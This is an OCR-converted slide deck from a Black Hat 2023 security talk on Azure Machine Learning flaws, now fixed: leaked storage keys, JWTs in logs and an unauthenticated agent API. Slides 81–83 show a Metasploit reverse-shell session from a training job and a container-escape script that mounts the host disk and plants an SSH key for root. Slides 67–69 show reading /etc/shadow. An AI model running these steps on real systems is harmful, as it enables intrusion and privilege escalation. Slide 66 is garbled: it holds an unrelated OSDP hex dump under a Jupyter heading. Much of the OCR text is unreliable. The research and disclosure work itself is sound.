---
title: "Uncovering Azure's Silent Threats A Journey into Cloud Vulnerabilities"
speakers: ["Nitesh Surana", "Magno Logan", "David Fiser"]
conference: "Black Hat"
conference_full: "Black Hat USA 2023"
edition: "USA"
year: 2023
source_pdf: "Black Hat USA 2023 slides/Nitesh Surana & Magno Logan & David Fiser_Uncovering Azure's Silent Threats A Journey into Cloud Vulnerabilities.pdf"
pages: 98
sha256: "5a8abe36b149ea82b8287b66eabc18e00b2373545bc073c43ed8d91442620301"
text_chars: 32020
ocr_pages: 42
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.0
ocr_unreliable_blocks: 0
vision_verified_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T04:19:38Z"
---
# Uncovering Azure's Silent Threats A Journey into Cloud Vulnerabilities

**Speakers:** Nitesh Surana, Magno Logan, David Fiser  
**Conference:** Black Hat USA 2023  
**Source:** `Black Hat USA 2023 slides/Nitesh Surana & Magno Logan & David Fiser_Uncovering Azure's Silent Threats A Journey into Cloud Vulnerabilities.pdf` (98 pages)


## Slide 1

### Uncovering Azure's Silent Threats: A Journey into Cloud Vulnerabilities


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA &
AUGUST 9-10, ©0253
BRIEFINGS
Uncovering Azure's Silent Threats:
A Journey into Cloud Vulnerabilities
@ TREND:
```

## Slide 2

From Sikkim, India Threat Research (Cloud/Container focus) Member of **null – The Open Security Community** First Song: 2018, First Hack: 2009

Previously @ SOC, Threat Hunting/Intel, VDPs Socials: https://linktr.ee/niteshsurana

<u>@_niteshsurana</u>

#BHUSA @BlackHatEvents

## Slide 3

#### Outline

- CH 0: The Beginning

- CH 1: Did you see my keys?

- CH 2: Wait, is that my token?

- CH 3: Spying the Scientist

- Bonus: The Funhouse of Experiments

- • Conclusion

#BHUSA @BlackHatEvents

## Slide 4

###### CH 0: Introduction

#BHUSA @BlackHatEvents

## Slide 5

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Update on the vulnerability in the Azure Cosmos
A DB Jupyter Notebook |Feature
Microsoft Mitigates Vulnerability in Jupyter
A Notebooks for Azure Cosmos DB
MSRC / By MSRC / November 01, 2022 / 2 min read
December O02, 2021
AS AWS SageMaker |Jupyter Notebook
eee! Instance Takeover
éy Cookie Tossing to RCE on Google Cloud JupyterLab
```

## Slide 6

#BHUSA @BlackHatEvents

Azure Machine Learning


> Recovered by OCR — confidence 93/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
/ jupyter
All Marketplace (31) Documentation (99+)
Resource Groups (0)
Documentation
Run Jupyter notebooks in your workspace - Azure Machine Learni...
Azure Machine Learning
```

## Slide 7

#### Why AML?

5X
2019 2023
Source: Gartner

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
And you can use Azure Machine Learnin
> pl ) = 12:20/16:27 - Use Al supercomputer infrastructure for your workloads >
What runs ChatGPT? Inside Microsoft's Al supercomputer | Featuring Mark
Russinovich
```

## Slide 8

###### Azure Machine Learning

#BHUSA @BlackHatEvents

## Slide 9

#### Basics of AML

###### Azure Machine Learning

Workspace

#BHUSA @BlackHatEvents

## Slide 10

Accessing Workspace using AML Studio (https://ml.azure.com/)

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Azure Al | Machine Learning Studio © a 8 a ? © zi = Vv Or
lema ,
< All workspaces d e aa re) 4 ++ New v == Customize view
| © Home
Authoring Get started: Train and deploy Distributed GPU training = = Automate with Pipelines
4 a model o Run a sample multi-GPU image == Create a production pipeline for a
El Notebooks Train and deploy a sample image classification experiment. credit default prediction sample.
lassification model.
45, Automated ML .
a Designer Start 25 minutes Start 30 minutes Start 35 minutes
Assets
Shortcuts ~~ >
ES Data
A Jobs EF Create notebook \ Add compute @ ~ Connect data 7 Train a model
AS Components Use notebooks for interactive <> A designated resource for running Connect data from datastores, local Submit a command job to train
cloud development. your training script, notebook, or files, public URLs, or Open Datasets your model using your own code.
& Pipelines hosting your service deployment. assets.
& Environments Create new notebook Add compute Add data Create job
@ Models
@> Endpoints .
Recently viewed ~~ View all
Accessing Workspace using AML Studio (https://ml.azure.com/)
```

## Slide 11

#### Basics of AML

Workspace

Storage Account

Key Vault

Container Registry* App Insights

*optional

#BHUSA @BlackHatEvents

## Slide 12

#### Compute Targets

- Compute Cluster

- Kubernetes Clusters

- • Attached Compute • Compute Instance

#BHUSA @BlackHatEvents

## Slide 13

#### Compute Targets

- Compute Cluster

- • Kubernetes Clusters • Attached Compute

- Compute Instance

#BHUSA @BlackHatEvents

## Slide 14

#### Compute Instance Overview

Compute Instance Managed Ubuntu-based VMs

Jupyter
GPU Drivers VSCode
Conda Docker
PyTorch Python
TensorFlow

#BHUSA @BlackHatEvents

## Slide 15

#### Storage Account Overview

Datastores
Jupyter Notebooks
Datasets Logs
Storage Account
Models Snapshots
Python Scripts
File Share
Blob Storage

#BHUSA @BlackHatEvents

## Slide 16

#### Datastore Overview

Datastores mapped to File Shares and Blob Storage of Workspace

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
workspaceartifactstore Azure Blob Storage - azureml|-blobstore-90092ee
workspaceworkingdirectory Azure file share Mi insights-metrics-ptim
Vv = File Shares
workspacefilestore Azure file share - azureml-filestore-90092eee-
workspaceblobstore (Default) Azure Blob Storage Mi Queues
> [HE Tables
Datastores mapped to File Shares and Blob Storage of Workspace
```

## Slide 17

Username: Storage Account Name Password: Storage Account Access Key

File Share only uses credential-based Auth-N (Source: MS Docs)

#BHUSA @BlackHatEvents

## Slide 18

File Share
Users Compute Instances Workspace

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
AR
6)
e
File Share
Users Compute Instances Workspace
```

## Slide 19

###### CH 1: Did you see my keys?

#BHUSA @BlackHatEvents

## Slide 20

#### Directories in Compute Instance

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
> +
Directories in Compute Inst: r
Esl 1:mybox x
»
azureuser@mybox: /mnt/batchs cd tasks/
azureuser@mybox: /mnt/batch/tasks$
1s
applications fsmounts shared startup volatile workitems
ls -al
azureuser@mybox: /mnt/batch/tasks5
total 32
drwxrwx--- 8 azbatch azbatchgrp
drwxr-xr-x 4 root root
drwxrwx--—— 2 azbatch azbatchgrp
drwxrwx--- 2 azbatch azbatchgrp
drwxrwx--- 2 azbatch azbatchgrp
azureuser@mybox: /mnt/batch/tasks$
4096
4096
4096
4096
4096
4096
4096
4096
Jul
Jul
Jul
Jul
Jul
Jul
Jul
Jul
21
21
21
21
21
21
21
21
10:02
10:02
10:02
10:02
10:02
10:02
10:02
10:02
.
applications
fsmounts
shared
startup
volatile
workitems
```

## Slide 21

#### Azure Batch Components

- Nodes: VMs (Linux/Windows)

- Pools: Logical group of Nodes

- Job: Collection of tasks, E.g., 10 runs of a script

- Task: Individual run of a job, E.g., 1 single run of a script

Nodes
Pool

#BHUSA @BlackHatEvents

## Slide 22

- _start_ task:

   - Runs when a node starts up

   - Programs/Files required stored in

/mnt/batch/tasks/startup/

- Output of _start_ task in

- /mnt/batch/tasks/startup/stderr.txt /mnt/batch/tasks/startup/stdout.txt

#BHUSA @BlackHatEvents

## Slide 23

File Share

mounted on

Compute Instance

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@
mounted on
File Share Compute Instance
2022/08/18 69:18:39|Running following command: /usr/bin/sudo mount -t cifs //niteshamlws5927017212| f
2022/08/18 @9:18:39|Running following command: /usr/bin/sudo mount -t cifs //niteshamlws5927017212|f
```

## Slide 24

#### Access Keys in error, auth logs

- Output of _start_ task logged in – _/mnt/batch/tasks/startup/{stdout,stderr}.txt_

- _‘sudo’_ commands logged in _/var/log/auth.log_

#BHUSA @BlackHatEvents

## Slide 25

#BHUSA @BlackHatEvents

## Slide 26

#### Fix: Access Key masked

Fix: Masked Storage Account Access Key in Batch error logs

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
bisekhat Fix: Access Key maske fA
2022/09/27 @8:08:30 Running following command: /usr/bin/sudo mo
username=niteshamlws425015195@ ,|password=*************) dir mode=
serverino
Fix: Masked Storage Account Access Key in Batch error logs
```

## Slide 27

#BHUSA @BlackHatEvents

## Slide 28

- Manages Compute Instance

- Located at _: /mnt/batch/tasks/startup/wd/_

- Agents

   - Configs == $environment variables

Compute Instance

- Agent configs in files at:

_/mnt/batch/tasks/startup/wd/dsi/_

#BHUSA @BlackHatEvents

## Slide 29

#### Access Keys in agent env. files

• Config for agents: dsimountagent → _/mnt/batch/tasks/startup/wd/dsi/dsimountagentenv_ dsiidlestopagent → _/mnt/batch/tasks/startup/wd/dsi/dsiidlestopagentenv_

Storage Account Access Key in agent config file (x2)

#BHUSA @BlackHatEvents

## Slide 30

#### Key passed as an env. variable

Source: mount.cifs(8) - Linux man page

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pisekhat Key passed 45 an env. varic i
password=arg
specifies the CIFS password. If this option is not given then] the environment variable PASSWD is used.
If the password is not specified directly or indirectly via an argument to mount, mount.cifs will prompt
for a password, unless the guest option is specified.
Source: mount.cifs(8) - Linux man page
```

## Slide 31

###### CH 2: Wait, is that my token?

#BHUSA @BlackHatEvents

## Slide 32

Load Balancer <CI_NAME>.<REGION>.instances.azureml.ms/tree/ User <CI_NAME>.<REGION>.instances.azureml.ms/lab

Compute Instance

e.g. JupyterLab URL - https://aml.eastasia.instances.azureml.ms/lab

#BHUSA @BlackHatEvents

## Slide 33

#BHUSA @BlackHatEvents

###### Access Compute Instance using JupyterLab


> Recovered by OCR — confidence 84/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
~ File Edit View Run
Kernel Tabs Settings Help
Cc 3 azureuser@mybox: /mnt/bat X
Last Modified
6 days ago
Hi J
Access Compute Instance using JupyterLab
```

## Slide 34

Access Compute Instance using browser-embedded Terminal

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Azure Al | Machine Learning Studio
=| Notebooks _
[] 1:mybox x
fe Automated ML
» .
Assets azureuser@mybox:~S whoami
2 BENE a azureuser@mybox:~$ sudo su
A Jobs 2 root@mybox: /home/azureuser# L
Access Compute Instance using browser-embedded Terminal
```

## Slide 35

Client Azure Active Directory Azure Machine Learning User Compute
Login
ARM Token
AML Token
ARM Token
User
Perform AML actions

###### Authentication flow for a user accessing AML service

#BHUSA @BlackHatEvents

## Slide 36

nginx config of the Compute Instance

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
listen 44224 ssl \default_server;
ssl_certificate /mnt/batch/tasks/startup/certs/shal-c552de288f946fc143edd721a5b03a2@bbdf504b. pem;
if |($i_cn|!~ "*DigiCert SHA2 Secure Server CA$|*DigiCert SHA2 Secure Server CA$") {
return 401;
}
if |($s_cn| != eastasia.identity.notebooks.azureml.net)) {
| return 401;
}
nginx config of the Compute Instance
```

## Slide 37

nginx config of the Compute Instance

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
if ($http_x_ms_target_port ~ *[@-9]+$) {
set $proxyhost 127.0.0.1:$http_x_ms_target_port; (umm
}
if ($http_x_ms_target_port !~ *[@-9]+$) { (——«»—~
return 401;
}
location ~ (/api/1s/|/api/kernels/|/terminals/websocket/ | /ws/|/ws|/p\/(\w+)\/terminal\/(\w+)/|/websocket/) {
proxy_pass http://$proxyhost ; (ummm
proxy_set_header Host $http_x_forwarded_host;
# websocket support
proxy_http_version 1.1;
proxy_set_header Upgrade “websocket";
proxy_set_header Connection “Upgrade”;
proxy_read_timeout 86400 ;
}
location / {
proxy_pass http: //$proxyhost ; (mmm nginx config of the Compute Instance
proxy_set_header Host $http_x_forwarded_host;
```

## Slide 38

#### Incoming Request Flow

127.0.0.1:8888
0.0.0.0:44224
/var/log/nginx/{access,error}.log

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
GET /terminals/websocket/2?token=eyJ@eXAi0iJ... HTTP/1.1
Host: aml.eastasia.instances.azureml.ms
X-MS-Target-Port: 8888
127.0.0.1:8888
0.0.0.0:44224
> NGINX >
```

## Slide 39

#### JWT logged in nginx access logs

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pisekhat JWT logged in nginx access log
1:mybox x —_
G92 © Compute: | mybox - Runni
Terminate running processes? Xx
Closing this tab will terminate all the running processes.
“DELETE /api/terminals/2 HTTP/1.1" 204 @ "-" "™"
```

## Slide 40

Decode JWT to view the AML token

#BHUSA @BlackHatEvents

## Slide 41

#### JWT token in URL parameter

Jupyter server can receive token in URL parameter (Source: Jupyter Docs)

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pi&tkhat JWT token in URL parameter
e inthe Authorization header, e.g.:
Authorization: token abcdef...
e |In a URL parameter, e.g.:
e In the password field of the login form that will be shown to you if you are not logged in.
Jupyter server can receive token in URL parameter (Source: Jupyter Docs)
```

## Slide 42

##### What could go wrong?

#BHUSA @BlackHatEvents

## Slide 43

Error logs being shared on public platforms like GitHub

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
cluster to 0 and back to 2.
stderr.txt
Thanks for reporting the problem. can you please provide stdout.txt and
/mnt/batch/tasks/startup/ for investigation? You can solve the problem by resizing the
Error logs being shared on public platforms like GitHub
from
```

## Slide 44

#### Supply Chain Attack in Dependencies

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
piSekhat Supply Chain Attack in Depender
PyTorch discloses malicious dependency chain
compromise over holidays
By Ax Sharma
current username from ~getlogin()~
current working directory name from ~ getcwd()”
environment variables
the first 1000 files in the user's ~$Home~ directory
January 1, 2023
```

## Slide 45

Storage Account

File Share

Jupyter Notebooks
Datasets Logs
Models Snapshots

Python Scripts

Blob Container

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Jupyter Notebooks
5 °
File Share
Storage Account =.
Blob Container
Datasets (G0) =| Logs
Models =. Snapshots
Python Scripts
```

## Slide 46

File Share
Users Compute Instances Workspace

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
an
File Share
Users \ compu Instances workspace /
```

## Slide 47

File Share
Users Compute Instances Workspace

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
an
File Share
Users \ compu Instances workspace /
```

## Slide 48

File Share
Users Compute Instances Workspace

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
an
File Share
Users \ compu Instances workspace /
```

## Slide 49

File Share
Users Compute Instances Workspace

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
File Share
Users \ comput Instances workspace /
```

## Slide 50

Source: MS Docs

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
An Azure Machine Learning datastore is a reference to an existing storage account on Azure. A
datastore offers these benefits:
1. A common and easy-to-use API, to interact with different storage types (Blob/Files/Azure
Data Lake Storage) and authentication methods.
2. An easier way to discover useful datastores, when working as a team.
ir your scripts, a way to hide connection information for credential-based data access
service principal/SAS/key).
Source: MS Docs
```

## Slide 51

Access Keys stored in cleartext (x4 instances)

#BHUSA @BlackHatEvents

## Slide 52

Fixed

<u>https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23382</u>

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Azure Machine Learning Compute Instance Information Disclosure Vulnerability
CVE-2023-23382
Security Vulnerability
Released: Feb 14, 2023 Last updated: Apr 14, 2023
Assigning CNA: © = Microsoft v Fixed
Impact: Information Disclosure Max Severity: Important
CVSS:3.16.5/5.7 ©
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-23382
```

## Slide 53

#### Takeaways

- Logging/storing credentials in cleartext is unhealthy

- Understand <u>dev-centric features & their associated risks</u>

- While using open-source tools, review configurations

- Sensitive information should not be sent as URL parameters

- Check logs for sensitive information before sharing

#BHUSA @BlackHatEvents

## Slide 54

###### CH 3: Spying the Scientist

#BHUSA @BlackHatEvents

## Slide 55

###### Compute Instances can be created in vNets

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Create compute instance
© Required Settings @ _) Enable idle shutdown ©
@ Advanced Settings
optional
Compute Instances can be created in vNets
Startup and shutdown schedule (|)
fF Add schedule
Use this to create the compute within an existing
virtual network. Learn more about how to enable
virtual network for compute instances.
© Refresh virtual networks
Subnet
```

## Slide 56

vNet

Virtual Machine

Compute Instance

#BHUSA @BlackHatEvents

## Slide 57

- Compute Instance exposes a port – 46802

- Process listening is dsimountagent

Compute Instance

- Runs with high privileges (as ‘root’)

- Written in Go, closed-source, not stripped

dsimountagent

#BHUSA @BlackHatEvents

## Slide 58

• Function: _hosttools/dsi.StartApiService_

• Exposes following endpoints:

- _/ci-api/v1.0/filesystem/sync_

- _- /ci-api/v1.0/datamount_

_- /ci-api/v1.0/services/_

- _/ci-api/v1.0/imageversion_

_- /aml-api/v1.0/datamount_

No AuthN for network-adjacent resources

#BHUSA @BlackHatEvents

## Slide 59

- _/ci-api/v1.0/filesystem/sync ->_ execute _sync_ command on a file

- _/{ci,aml}-api/v1.0/datamount ->_ run _mount_ operation

- _/ci-api/v1.0/imageversion_

   - _->_ view the Compute Instance image version

- _/ci-api/v1.0/services/ ->_ list any systemd services’ status

#BHUSA @BlackHatEvents

## Slide 60

• _/ci-api/v1.0/filesystem/sync ->_ execute _sync_ command on a file

• _/{ci,aml}-api/v1.0/datamount ->_ run _mount_ operation

• _/ci-api/v1.0/imageversion ->_ view the Compute Instance image version

• _/ci-api/v1.0/services/ ->_ list any systemd services’ status

#BHUSA @BlackHatEvents

## Slide 61

#### Status & List of Services on CI

###### _/ci-api/v1.0/_ **_services_** _/_ → status of **all** **_systemd_** services

#BHUSA @BlackHatEvents

## Slide 62

#### Viewing Service Logs on CI

_/ci-api/v1.0/services/<_ **_service_** _>/logs?limit=5000_ → see any **services** ’ **logs**

#BHUSA @BlackHatEvents

## Slide 63

vNet

Information Disclosure
Virtual Machine

Compute Instance

#BHUSA @BlackHatEvents

## Slide 64

###### How bad could it be?

#BHUSA @BlackHatEvents

## Slide 65

###### Jupyter installed as a _systemd_ service

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
jupyter.service loaded |lactive running
Jupyter installed as a systemd service
```

## Slide 66

#### Jupyter Service Logs

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
DEMO - Crashing the CP's OSDP Service

door close

[terminal tabs] 6. kali_tty (1)   8. kali_tty (1)   9. kali_tty (1)

cp -> pd: b'536007000060e6'
cp -> pd: b'536007000060e6'
cp -> pd: b'536107000060e5'
cp -> pd: b'536107000060e5'
cp -> pd: b'536207000060e4'
cp -> pd: b'536207000060e4'
cp -> pd: b'536307000060e3'
cp -> pd: b'536307000060e3'
cp -> pd: b'536407000060e2'
cp -> pd: b'536407000060e2'
cp -> pd: b'536507000060e1'
cp -> pd: b'536507000060e1'
pd -> cp: b'53e50700004081'
pd -> cp: b'53e50700004081'
cp -> pd: b'53650800006200de'
cp -> pd: b'53650800006200de'
pd -> cp: b'53e53400004601000002000003010004040105020106000007000008010009'
pd -> cp: b'53e53400004601000002000003010004040105020106000007000008010009'
***** message is not valid
pd -> cp: b'01010a92030b92030c00000e00000f00001001009c'
pd -> cp: b'01010a92030b92030c00000e00000f00001001009c'
cp -> pd: b'53650900056100e94d'
cp -> pd: b'53650900056100e94d'
pd -> cp: b'53e51400054500068e0101f5098036053800b9f7'
pd -> cp: b'53e51400054500068e0101f5098036053800b9f7'
cp -> pd: b'536516000669000000000000000000010101010150e4'
cp -> pd: b'536516000669000000000000000000010101010150e4'
pd -> cp: b'53e508000640b0f0'
pd -> cp: b'53e508000640b0f0'
cp -> pd: b'53650d00076a00020101031e8f'
cp -> pd: b'53650d00076a00020101031e8f'
pd -> cp: b'53e50800074081c3'
pd -> cp: b'53e50800074081c3'
cp -> pd: b'53651600056900000000000000000001010101011d0c'
cp -> pd: b'53651600056900000000000000000001010101011d0c'
pd -> cp: b'53e508000540e3a5'
pd -> cp: b'53e508000540e3a5'
cp -> pd: b'53650d00066a0001000000c198'
cp -> pd: b'53650d00066a0001000000c198'
pd -> cp: b'53e508000640b0f0'
pd -> cp: b'53e508000640b0f0'
cp -> pd: b'53650800076033c5'
cp -> pd: b'53650800076033c5'
pd -> cp: b'53e50800074081c3'
pd -> cp: b'53e50800074081c3'
cp -> pd: b'53650800056051a3'
cp -> pd: b'53650800056051a3'
```

## Slide 67

#### Command logged in Service Logs

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
blackhat Command logged in Service Log
3 USER=root ; COMMAND=/usr/bin/cat /etc/shadow
```

## Slide 68

#BHUSA @BlackHatEvents

## Slide 69

jupyter.service
$ sudo cat /etc/shadow
1
systemd  logs
User
2
vNet
/ci-api/v1.0/services/jupyter/logs
dsimountagent
:46802
Attacker
Virtual Machine Compute Instance
3
azureuser : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND= /usr/bin/cat /etc/shadow

#BHUSA @BlackHatEvents

## Slide 70

Azure Machine Learning Information Disclosure Vulnerability <u>Demo Video</u>

#BHUSA @BlackHatEvents

## Slide 71

Fixed

<u>https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28312</u>

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Azure Machine Learning Information Disclosure Vulnerability
CVE-2023-28312
Security Vulnerability
Released: Apr 11, 2023
Assigning CNA: © Microsoft
Impact: Information Disclosure Max Severity: Important
CVSS:3.16.5 / 5.7 ©
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-28312
```

## Slide 72

#### Takeaways

- Secret agents -> Secret bugs -> Invisible attack surface ++

- Vulnerabilities (still) exist in cloud agents

- Need for focused threat modelling on agent features

- Practicing Zero-Trust is hard; but crucial for cloud security

- • Simulating attacks in secure configs may uncover vulnerabilities

#BHUSA @BlackHatEvents

## Slide 73

#### Responsible Disclosure

- Found a way to achieve stealthy persistence in AML service

- • Reported to MSRC via ZDI in April (ZDI-CAN-20771)

- Issue reproducible before session recording (early July)

- Requested a status check with MSRC

- Microsoft to fix the reported issue by end of August

#BHUSA @BlackHatEvents

## Slide 74

The Funhouse of Experiments: A Rollercoaster Ride

#BHUSA @BlackHatEvents

## Slide 75

#BHUSA @BlackHatEvents

## Slide 76

###### • Container Escape in Azure ML Jobs

- No cross-tenant scenarios

- No Dependency Confusion in npm packages

- No misconfigurations in Jupyter implementation

#BHUSA @BlackHatEvents

## Slide 77

#### #1: Container Escape in AML Jobs

- Job: Command to execute in a specific environment

- Used to perform training

- Can track metrics, logs, outputs, performance

- Environment: Docker Image (dependencies, tools, libraries etc.)

- Environment can be curated/custom

#BHUSA @BlackHatEvents

## Slide 78

#### Creating a training job

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
piSekhat Creating a training j
@ Compute Compute
Select an existing compute target
© Environment
Select compute type
© Job settings | Automatic compute (Preview)
© Review Virtual machine type ©
(@) cPU () GPU
Virtual machine tier ©
(e) Dedicated C) Low priority
Virtual machine size
| Standard_DS3_v?2 (4 core(s), 14GB RAM, 28GB storage, $0.43/hr)
Number of instances
```

## Slide 79

#### Specifying an environment

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
© TrendMicro
+ New
fa Home
Author
Notebooks
4% Automated ML
#4 Designer
Assets
& Data
A Jobs
& Environments
@ Models
@ Endpoints
TrendMicro > nitesh-aml-ws > Environments > DSTest2
DSTest2 | Version: 6 (latest)
Details Context Build log
C) Refresh uly Rebuild
Properties
Environment image build status
@ Succeeded
Name
DSTest2
Created by
Nitesh Surana (TR-IN)
Creation date
Nov 15, 2022 12:25 AM
Jobs
Version
6
Environment operating system
Linux
Azure container registry
82a687d21234133f2402b785a
Asset ID
1 FROM debiank latest
a RUN apt update -y && apt install curl
weet net-tools ssh -y
```

## Slide 80

#### Questions

- Where does the job run in? And on what?

- Can I escalate from the container-to-host?

- Is the underlying host shared across other users/tenants?

- Are there nearby hosts to poke around?

#BHUSA @BlackHatEvents

## Slide 81

#### Fetch a Shell!

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pisekchat Fetch a Shell! x
Enter the command to start the job *
sleep 30
sleep 30
The command wall run from the reot of the uploaded code folder. Add any parameters and input references as needed.
msf6 exploit(multi/handler) > run Serving HTTP on 8.9.8.8 port 8986 (http://68.6.6.9:8880/ |
{*] Started reverse TCP handler on 6.6.8.8:8686 26.239.36.32 - - [15/Nov/2622 86:47:36] "GET /reverse H
[*] Sending stage (3845348 bytes) to 28.239.36.32 |TTP/1.1" 268 -
{*] Meterpreter session 2 opened (192.168.19.55:8886 -/|*C
> 26.239.38.32:1625) at 2822-11-15 68:48:16 +9538 Keyboard interrupt received, exiting.
$ |
```

## Slide 82

#### Listing running processes

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Listing running proc
msf6 expLoit(multi/handler) > run
[*] Started reverse TCP handler on 6.86.8.98:88880
[*] Sending stage (3045348 bytes) to 20.239.30.32
[*] Meterpreter session 2 opened (192.168.10.55:8686 —> 28.239.38.32:1625) at 2622-11-15 96:48:19 +8536
meterpreter > shell
Process 18 created.
Channel 1 created.
whoami
root
ps faux
USER PID %CPU %MEM VSZ
root 1 8.0 98.4 224672 17048
root 11 6.0 6.0 3176
root 18 08.0 86.0 2476
root 20 98.0 86.0 6752
STAT START
Ssl
Ss
R
19:17
19:17
19:18
19:18
TIME
8:00
8:80
COMMAND
./reverse
\_ /bin/sh
\_ ps faux
```

## Slide 83

#### Escaping the Container

<u>Credits: Docker API Honeypots + Percussive Elbow’s docker-escape-tool</u>

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pisekchat Escaping the Contain
<>] aml-jobs-escape.sh
sudo su
mkdir -p /hostOS
mount UUID=$(cat /proc/cmdline | sed s,=,\ ,g | awk ‘{print $5}') /hostOS
chroot /hostOS
ssh-keygen -N "" -f /tmp/test
cat /tmp/test.pub > /root/.ssh/authorized_ keys
ssh -oStrictHostKeyChecking=no -oBatchMode=yes -i /tmp/test root@127.0.0.1
Credits: Docker API Honeypots + Percussive Elbow’s docker-escape-tool
```

## Slide 84

#### Findings

- Where does the job run in? And on what? → Microsoft subscription, VMs

- • Can I escalate from the container-to-host? → Yes (Privileged Containers)

- Is the underlying host shared across other users/tenants? No

- Are there nearby hosts to poke around? (Only for the jobs you create)

#BHUSA @BlackHatEvents

## Slide 85

#### Findings

- Where does the job run in? And on what? → Microsoft subscription, VMs

- • Can I escalate from the container-to-host? → Yes (Privileged Containers)

- Is the underlying host shared across other users/tenants? No

- Are there nearby hosts to poke around? (Only for the jobs you create)

- Could the hosts be re-used?

#BHUSA @BlackHatEvents

